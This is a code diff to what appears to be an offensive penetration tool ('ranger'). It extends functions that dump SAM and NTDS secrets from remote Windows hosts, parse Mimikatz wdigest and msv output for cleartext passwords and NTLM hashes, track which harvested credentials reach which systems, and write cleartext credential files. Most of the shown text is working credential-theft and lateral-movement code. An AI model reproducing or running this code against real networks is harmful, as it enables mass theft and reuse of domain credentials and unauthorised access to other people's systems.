             print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
 
-def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict):
+def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict, command):
     message = ""
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
@@ -3626,6 +3697,8 @@ def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntd
     shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
     try:
         shell.dump()
+        data = shell.return_output_hashes()
+        message_list, creds_dict = output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occurred: %s") % (e)
         if hash:
@@ -3752,14 +3825,24 @@ def verify_open(verbose, scan_type, port, dst):
 '''
 CREDENTIAL Functions
 '''
-        
+# PWD AND HASH TEST        
 def pwd_test(pwd, verbose, usr = None):
     SID = None
     NTLM = ""
     LM = ""
     hash = None
+    dom_temp = None
     hash_count = []
     pwdump_format_hash = []
+    if pwd and ":" in pwd and pwd.count(':') == 5 and "\\" in pwd:
+        pwdump_format_hash = pwd.split(':')
+        temp_key = pwdump_format_hash[0]
+        dom_temp, usr = temp_key.split('\\') 
+        dom_temp = dom_temp.lower()
+        usr = usr.lower()
+        SID = None
+        LM = pwdump_format_hash[1]
+        NTLM = pwdump_format_hash[2]
     if pwd and ":" in pwd and pwd.count(':') == 6:
         pwdump_format_hash = pwd.split(':')
         if not usr:
@@ -3769,6 +3852,13 @@ def pwd_test(pwd, verbose, usr = None):
         SID = pwdump_format_hash[1]
         LM = pwdump_format_hash[2]
         NTLM = pwdump_format_hash[3]
+        try:
+            SID = int(SID)
+        except:
+            dom_temp = NTLM
+            NTLM = SID
+            LM = "aad3b435b51404eeaad3b435b51404ee"
+            SID = None
     elif pwd and ":" in pwd and pwd.count(':') == 1:
         format_hash = pwd.split(':')
         LM = format_hash[0]
@@ -3799,7 +3889,7 @@ def pwd_test(pwd, verbose, usr = None):
     hash_count = hash.split(':')
     if len(hash_count) != 2:
         LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
-    return(SID, LM, NTLM, hash, usr, pwd)
+    return(SID, LM, NTLM, hash, usr, pwd, dom_temp)
 
 def in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp):
     temp_list = creds_dict[temp_key]
@@ -3850,7 +3940,7 @@ def not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp
     creds_dict[temp_key] = temp_list
     return(creds_dict)
 
-def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = None):
+def add_to_creds_dict(logger_obj, verbose, creds_dict, dom, cred = None, usr = None, pwd = None):
     temp_list = []
     SID_temp = None
     LM_temp = None
@@ -3864,46 +3954,76 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
     logged_in_temp = []
     access_to_temp = []
     cached_temp = None
-    if pwd and ":" in pwd and pwd.count(':') != 6:
-        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom.lower()
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
+    if cred and ":" in cred and cred.count(':') == 5 and '\\' in cred:
+        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(cred, verbose, usr_temp)
+        if not dom_temp:
+            dom_temp = dom.lower()
         usr_temp = usr_temp.lower()
         temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
-            sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+            message = "[!] Credential %s does not have a username" % (str(hash_temp))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         else:
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-    elif pwd and ":" in pwd and pwd.count(':') == 6:
+    elif pwd and ":" in pwd and pwd.count(':') != 6 and '\\' not in pwd:
+        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(pwd_temp, verbose, usr_temp)
+        if not dom_temp:
+            dom_temp = "workgroup"
+        usr_temp = usr_temp.lower()
+        temp_key = "%s\\%s" % (dom_temp, usr_temp)
+        if not usr_temp:
+            message = "[!] Credential %s does not have a username" % (str(hash_temp))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
+        if temp_key in creds_dict:
+            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+        else:
+            creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+    elif pwd and ":" in pwd and pwd.count(':') == 6 and '\\' not in pwd:
         usr_temp = usr
-        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom.lower
+        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(pwd_temp, verbose, usr_temp)
+        if not dom_temp:
+            dom_temp = "workgroup"
         usr_temp = usr_temp.lower
         temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
-            sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+            message = "[!] Credential %s does not have a username" % (str(hash_temp))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         else:
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     elif pwd and ":" in pwd and pwd.count(':') == 1:
-        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom.lower()
+        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(pwd_temp, verbose, usr_temp)
+        if not dom_temp:
+            dom_temp = "workgroup"
         usr_temp = usr_temp.lower()
         temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
-            sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+            message = "[!] Credential %s does not have a username" % (str(hash_temp))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         else:
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-    elif usr and pwd and pwd not in ":":
-        dom_temp = dom.lower()
+    elif usr and pwd and ":" not in pwd:
+        if not dom_temp:
+            dom_temp = dom.lower()
         usr_temp = usr_temp.lower()
         temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
-            sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+            message = "[!] Credential %s does not have a username" % (str(hash_temp))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         else:
@@ -3912,14 +4032,17 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
         if cred.count(' ') == 1:
             cred = cred.rstrip('\n')
             hash_temp, dom_temp = cred.split(' ')
+            SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(hash_temp, verbose)
             if "WORKGROUP" not in dom or dom_temp == None:
                 dom_temp = dom
-            SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
-            dom_temp = dom_temp.lower()
+            if not dom_temp:
+                dom_temp = dom_temp.lower()
             usr_temp = usr_temp.lower()
             temp_key = "%s\\%s" % (dom_temp, usr_temp)
             if not usr_temp:
-                sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                notice = failure + message + cleanup
+                logger_obj.info(notice)
             if temp_key in creds_dict:
                 creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	    else:
@@ -3927,13 +4050,14 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
         elif cred.count(' ') == 0:
 	    cred = cred.rstrip('\n')
 	    hash_temp = cred
-	    dom_temp = dom
-	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
-            dom_temp = dom_temp.lower()
+	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(hash_temp, verbose)
+            dom_temp = "workgroup"
             usr_temp = usr_temp.lower()
 	    temp_key = "%s\\%s" % (dom_temp, usr_temp)
             if not usr_temp:
-                sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                notice = failure + message + cleanup
+                logger_obj.info(notice)
             if temp_key in creds_dict:
                 creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	    else:
@@ -3942,14 +4066,16 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
         if cred.count(' ') == 2:
 	    cred.rstrip('\n')
 	    usr_temp, hash_temp, dom_temp = cred.split(' ')
-	    if "WORKGROUP" not in dom or dom_temp == None:
-	        dom_temp = dom
-            dom_temp = dom_temp.lower()
             usr_temp = usr_temp.lower()
-	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
+	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(hash_temp, verbose, usr_temp)
+            dom_temp = dom_temp.lower()
+            if "WORKGROUP" not in dom or dom_temp == None:
+                dom_temp = dom.lower()
 	    temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	    if not usr_temp:
-                sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                notice = failure + message + cleanup
+                logger_obj.info(notice)
             if temp_key in creds_dict:
                 creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	    else:
@@ -3959,14 +4085,16 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 	        cred.rstrip('\n')
 		dom_temp, cred_temp = cred.split('\\')
 		usr_temp, hash_temp = cred_temp.split(' ')
-	        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
+	        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(hash_temp, verbose, usr_temp)
                 dom_temp = dom_temp.lower()
                 usr_temp = usr_temp.lower()
 		temp_key = "%s\\%s" % (dom_temp, usr_temp)
                 if "WORKGROUP" not in dom or dom_temp == None:
                     dom_temp = dom
 	        if not usr_temp:
-                    sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                    message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                    notice = failure + message + cleanup
+                    logger_obj.info(notice)
                 if temp_key in creds_dict:
                     creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	        else:
@@ -3974,20 +4102,24 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 	    else:
 	        cred.rstrip('\n')
 		usr_temp, hash_temp = cred.split(' ')
-		SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
+		SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp = pwd_test(hash_temp, verbose, usr_temp)
                 if "WORKGROUP" not in dom or dom_temp == None:
                     dom_temp = dom
                 dom_temp = dom_temp.lower()
                 usr_temp = usr_temp.lower()
                 temp_key = "%s\\%s" % (dom_temp, usr_temp)
 		if not usr_temp:
-                    sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                    message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                    notice = failure + message + cleanup
+                    logger_obj.info(notice)
                 if temp_key in creds_dict:
                     creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	        else:
                     creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	elif cred.count(' ') == 0:
-	    sys.exit("[!] Credential %s is not correctly formated") % (cred)
+            message = "[!] Credential %s does not have a username" % (str(cred))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
     elif ":" not in cred:
         if cred.count(' ') == 2:
 	    cred.rstrip('\n')
@@ -3998,7 +4130,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
             usr_temp = usr_temp.lower()
 	    temp_key = "%s\%s" % (dom_temp, usr_temp)
 	    if not usr_temp:
-                sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                notice = failure + message + cleanup
+                logger_obj.info(notice)
             if temp_key in creds_dict:
                 creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	    else:
@@ -4014,7 +4148,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
                 usr_temp = usr_temp.lower()
 	        temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	        if not usr_temp:
-                    sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                    message = "[!] Credential %s does not have a username" % (str(hash_temp))
+                    notice = failure + message + cleanup
+                    logger_obj.info(notice)
                 if temp_key in creds_dict:
                     creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	        else:
@@ -4026,15 +4162,19 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
                 user_temp = usr_temp.lower()
                 temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	        if not usr_temp:
-                    sys.exit("[!] Credential %s does not have a username") % (hash_temp)
+                    logger_obj.info("[!] Credential %s does not have a username") % (hash_temp)
                 if temp_key in creds_dict:
                     creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
 	        else:
                     creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         elif cred.count(' ') == 0:
-	    sys.exit("[!] Credential %s is not correctly formatted") % (cred)
+            message = "[!] Credential %s does not have a username" % (str(cred))
+            notice = failure + message + cleanup
+            logger_obj.info(notice)
     else:
-        sys.exit("[!] Credential %s is not correctly formatted") % (cred)
+        message = "[!] Credential %s does not have a username" % (str(cred))
+        notice = failure + message + cleanup
+        logger_obj.info(notice)
     return(creds_dict)    
 
 def is_empty(structure):
@@ -4043,7 +4183,8 @@ def is_empty(structure):
     else:
         return False
 
-def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr = None, pwd = None):
+# OUTPUT_HANDLER
+def output_handler(command, logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr = None, pwd = None):
     #add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = None)
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     groups_file = "/opt/ranger/results/groups/"
@@ -4062,32 +4203,26 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
     epic = (colorama.Fore.YELLOW)
     for k, v in output_cat.iteritems():
         if "invoker" in k:
-            if verbose > 2:
+            if verbose > 3:
                 logger_obj.info(data)
             if "gentilkiwi" in data:
                 creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
-                notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                notice = "[+] Accessed system %s with, %s\\%s : %s at: %s" % (dst, dom, usr, pwd, st)
+                notice = success + notice + cleanup
                 logger_obj.info(notice)
-                notice = ""
                 creds_dict, message_list = invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom, pwd, usr)
-                for message in message_list:
-                    if "[++]" in message:
-                        notice = (epic + message)
-                        logger_obj.info(notice)
-                        notice = ""
-                    if "[+]" in message:
-                        notice = (success + message)
-                        logger_obj.info(notice)
-                        notice = ""
-                    if "[-]" in message:
-                        notice = (failure + message)
-                        logger_obj.info(notice)
-                        notice = ""
+                for notice in message_list:
+                    logger_obj.info(notice)
             else:
-                notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                notice = "[!] Failed to access system %s with, %s\\%s : %s at: %s" % (dst, dom, usr, pwd, st)
+                notice = failure + notice + cleanup
                 logger_obj.info(notice)
                 notice = ""
-            print(cleanup)
+                if "ObjectNotFound" in data:
+                    notice = "[!] The attack could not find the requested script, check for issues with routing, VPN connectivity, or conflicting service instances"
+                    notice = failure + notice + cleanup
+                    logger_obj.info(notice)
+            notice = ""
             filename = "logged_in_users" + "_" + dst
             dir = logged_in_file + filename
             with open(dir, 'w') as f:
@@ -4150,20 +4285,19 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
             #    logger_obj.info(data)
             if "\\" in data:
                 creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
-                message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, dst, data, usr)
-                notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                message_list, creds_dict = logged_in_users_method(verbose, creds_dict, dom, dst, data, usr)
+                notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s" + cleanup) % (dst, dom, usr, pwd, st)
                 logger_obj.info(notice)
                 notice = ""
             else:
-                notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                notice = "[!] Failed to access system %s with, %s\\%s : %s at: %s" % (dst, dom, usr, pwd, st)
+                notice = failure + notice + cleanup
                 logger_obj.info(notice)
                 notice = ""
-            if "+" in message:
-                notice = (success + message)
-                if verbose > 0:
-                    logger_obj.info(notice)
-                notice = ""
-            print(cleanup)
+            for notice in message_list:
+                logger_obj.info(notice)
+            for notice in message_list:
+                logger_obj.info(notice)
             filename = "logged_in_users" + "_" + dst
             dir = logged_in_file + filename
             with open(dir, 'w') as f:
@@ -4173,13 +4307,32 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
                 logger_obj.info(data)
             filename = "secrets_dump" + "_" + dst
             dir = secrets_file + filename
+            creds_dict, message_list = secrets_dump_parser(verbose, creds_dict, data, logger_obj, dst, dom, pwd, usr)
+            output_location = "[*] Wrote results to the following location %s" % (str(dir))
+            logger_obj.info(output_location)
+            for notice in message_list:
+                logger_obj.info(notice)
             with open(dir, 'w') as f:
-                f.write(data)
+                for line_temp in data:
+                    f.write(line_temp + "\n")
         elif "command" in k:
-            if verbose > 1:
-                logger_obj.info(data)
             filename = k + "_" + dst
             dir = commands_file + filename
+            if data:
+                notice = "[+] The command %s was successful on %s" % (str(command), str(dst))
+                notice = success + notice + cleanup
+                logger_obj.info(notice)
+                output_location = "[*] Wrote results to the following location %s" % (str(dir))
+                logger_obj.info(output_location)
+            else:
+                notice = "[-] The command %s was unsuccessful on %s" % (str(command), str(dst))
+                notice = failure + notice + cleanup
+                logger_obj.info(notice)
+                output_location = "[*] Wrote results to the following location %s" % (str(dir))
+                logger_obj.info(output_location)
+            notice = ""
+            if verbose > 0:
+                logger_obj.info(str(data))
             with open(dir, 'w') as f:
                 f.write(data)
         else:
@@ -4189,7 +4342,7 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
             dir = results_fule + filename
             with open(dir, 'w') as f:
                 f.write(data)
-        return(message,creds_dict)
+        return(message_list,creds_dict)
 
 def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict):
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
@@ -4198,13 +4351,13 @@ def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, s
     elif wmiexec_cmd:
         creds_dict = wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif netview_cmd:
-        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
+        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict, command)
     elif smbexec_cmd:
         smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif atexec_cmd:
         atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif sam_dump:
-        creds_dict = sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
+        creds_dict = sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict, command)
     else:
         print(instructions)
     return(creds_dict) 
@@ -4216,11 +4369,10 @@ def matrix_read(creds_matrix):
     return(creds_dict)
     
 def matrix_write(creds_dict, recovery, logger_obj):
-    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
         creds_matrix = "/opt/ranger/results/recovery/recovery_matrix"
     else:
-        creds_matrix = "/opt/ranger/results/credentials/credential_matrix_" + st
+        creds_matrix = "/opt/ranger/results/credentials/credential_matrix"
     with open(creds_matrix, 'w') as f:
         f.write(str(creds_dict))
     return(creds_matrix)
@@ -4244,24 +4396,72 @@ def targets_curtail(dst, final_targets):
     return(final_targets)
 
 def cleartext_writer(creds_dict, recovery, logger_obj):
-    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     cred_list = []
     if recovery:
         cred_file = "/opt/ranger/results/recovery/recovery_cleartext"
     else:
-        cred_file = "/opt/ranger/results/credentials/cleartext_" + st
+        cred_file = "/opt/ranger/results/credentials/cleartext"
     try:
         for k, v in creds_dict.iteritems():
             if v[5]:
                 set = k + " " + v[5]
                 cred_list.append(set)
-        with open(cred_file, 'w') as f:
-            for cred in cred_list:
-                f.write(cred + '\n')
+        remove_dup_line_in_file(cred_file, cred_list, recovery, logger_obj)
     except Exception as e:
-        notice = "An error occurred: %s" % (e)
+        notice = "[!]  An error occurred: %s" % (e)
+        notice = failure + notice + cleanup
         logger_obj.info(notice)
     return(cred_file)
+
+def secrets_dump_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd = None, usr = None):
+    data_null = None
+    temp_list = []
+    SID_temp = None
+    LM_temp = None
+    NTLM_temp = None
+    hash_temp = None
+    usr_temp = usr
+    pwd_temp = pwd
+    dom_temp = dom
+    local_admin_temp = []
+    groups_temp = {}
+    cached_temp = None
+    logged_in_temp = []
+    access_to_temp = []
+    message = ""
+    message_list = []
+    message_list_temp = []
+    temp_list = []
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
+    try:
+        for line in data:
+            if line and "ASP" not in line:
+                dom_temp = None
+                SID, LM, NTLM, hash, usr, pwd, dom_temp = pwd_test(line, verbose)
+                creds_dict = add_to_creds_dict(logger_obj, verbose, creds_dict, dom, line)
+                if dom_temp == None:
+                    dom_temp = "workgroup"
+                message = "[+] %s\\%s has access to system %s" % (dom_temp, usr, dst)
+                message = success + message + cleanup
+                message_list.append(message)
+                message = "[+][+] Extracted the following hash %s" % (line)
+                message = epic + message + cleanup
+                message_list.append(message)
+                creds_dict = access_to_method(verbose, creds_dict, dom_temp, data, usr, pwd, dst)
+    except Exception as e:
+        notice = "[!] An error occurred recording the hash %s from secrets-dump: %s" % (line,e)
+        notice = failure + notice + cleanup
+        logger_obj.info(notice)
+    set = sets.Set(message_list)
+    message_list = list(set)
+    return(creds_dict, message_list)
 
 def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd = None, usr = None):
     data_null = None
@@ -4293,7 +4493,12 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
     msv_dict = {}
     keyed = ""
     message_list = []
+    message_list_temp = []
     temp_list = []
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     parse_list = data.splitlines(True)
     wdigest_indices = [i for i, elem in enumerate(parse_list) if 'wdigest' in elem]
     msv_indices = [i for i, elem in enumerate(parse_list) if 'msv' in elem] 
@@ -4309,6 +4514,9 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
         item_range = None
         mi += 1
     for k, v in wdigest_results.iteritems():
+        raw_domain = ""
+        raw_username = ""
+        raw_password = ""
         if "kerberos" in v or not v:
             continue
         else:
@@ -4318,11 +4526,11 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
                         continue
                     if "Domain" or "Username" or "Password" in item:
                         if "Domain" in item:
-                            idicator1, raw_domain = item.split(':')
+                            idicator1, raw_domain = item.split(':',1)
